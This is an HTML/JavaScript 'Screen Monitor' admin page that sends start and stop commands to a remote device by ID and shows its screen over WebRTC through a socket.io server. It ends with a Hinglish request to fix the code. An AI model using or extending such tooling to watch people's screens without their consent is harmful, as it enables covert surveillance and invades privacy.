<!DOCTYPE html>
<html>
<head>
<title>Screen Monitor</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
<style>
body{background:#111;color:#fff;font-family:sans-serif;text-align:center}
video{width:360px;height:640px;background:black;border-radius:20px}
button{padding:12px 25px;margin:10px;font-size:16px}
</style>
</head>

<body>

<h2>Screen Monitor</h2>

<input id="id" placeholder="Device ID">
<br>

<button onclick="start()">START</button>
<button onclick="stop()">STOP</button>

<br><br>
<video id="v" autoplay playsinline></video>

<script>
const socket = io("https://child-v9no.onrender.com");
let pc;
let deviceId;

socket.on("connect", ()=>{
  socket.emit("join-room","ADMIN");
});

socket.on("offer", async d=>{
  pc = new RTCPeerConnection({
    iceServers:[{urls:"stun:stun.l.google.com:19302"}]
  });

  pc.ontrack = e=>{
    document.getElementById("v").srcObject = e.streams[0];
  };

  pc.onicecandidate = e=>{
    if(e.candidate){
      socket.emit("candidate",{
        target: deviceId,
        candidate: e.candidate.candidate,
        sdpMid: e.candidate.sdpMid,
        sdpMLineIndex: e.candidate.sdpMLineIndex
      });
    }
  };

  await pc.setRemoteDescription({
    type:"offer",
    sdp:d.sdp
  });

  const ans = await pc.createAnswer();
  await pc.setLocalDescription(ans);

  socket.emit("answer",{
    target: deviceId,
    sdp: ans.sdp
  });
});

function start(){
  deviceId = document.getElementById("id").value;
  socket.emit("send-command",{
    targetId: deviceId,
    command:"start_screen"
  });
}

function stop(){
  socket.emit("send-command",{
    targetId: deviceId,
    command:"stop_screen"
  });
  if(pc){ pc.close(); pc=null; }
}
</script>

</body>
</html> ham ko lagta hai ab error isa mai hai dekho to hai to sahi kar ke do code 
